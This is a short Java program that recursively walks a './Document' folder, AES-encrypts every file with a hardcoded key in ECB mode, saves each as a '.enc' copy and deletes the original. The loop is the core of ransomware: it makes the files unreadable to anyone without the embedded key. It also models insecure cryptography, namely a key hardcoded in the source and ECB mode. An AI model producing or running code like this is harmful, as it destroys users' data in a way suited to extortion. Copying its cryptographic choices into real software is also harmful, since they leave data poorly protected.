import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;

public class Encryption {

    public static void main(String[] args) {
        // Initialize AES in ECB mode
        byte[] keyBytes = "secrethulaanmoparamalamanmohehee".getBytes();
        SecretKey key = new SecretKeySpec(keyBytes, "AES");
        Cipher cipher;
        try {
            cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.ENCRYPT_MODE, key);
        } catch (Exception e) {
            throw new RuntimeException("Error while setting up AES", e);
        }

        // Looping through target files
        try {
            Files.walk(Paths.get("./Document"))
                    .filter(Files::isRegularFile)
                    .forEach(path -> {
                        try {
                            // Encrypt the file
                            System.out.println("Encrypting " + path + "...");

                            // Read file contents
                            byte[] original = Files.readAllBytes(path);

                            // Encrypt bytes
                            byte[] encrypted;
                            try {
                                encrypted = cipher.doFinal(original);
                            } catch (IllegalBlockSizeException | BadPaddingException ex) {
                                System.out.println("Error: Input data length or padding is invalid for AES encryption");
                                return;
                            }

                            // Write encrypted contents
                            Path encryptedFilePath = Paths.get(path.toString() + ".enc");
                            Files.write(encryptedFilePath, encrypted);

                            // Delete the original file
                            Files.delete(path);
                        } catch (IOException | RuntimeException e) {
                            System.out.println("Error while processing file: " + path);
                            e.printStackTrace();
                        }
                    });
        } catch (IOException e) {
            throw new RuntimeException("Error while walking through directory", e);
        }
    }
}
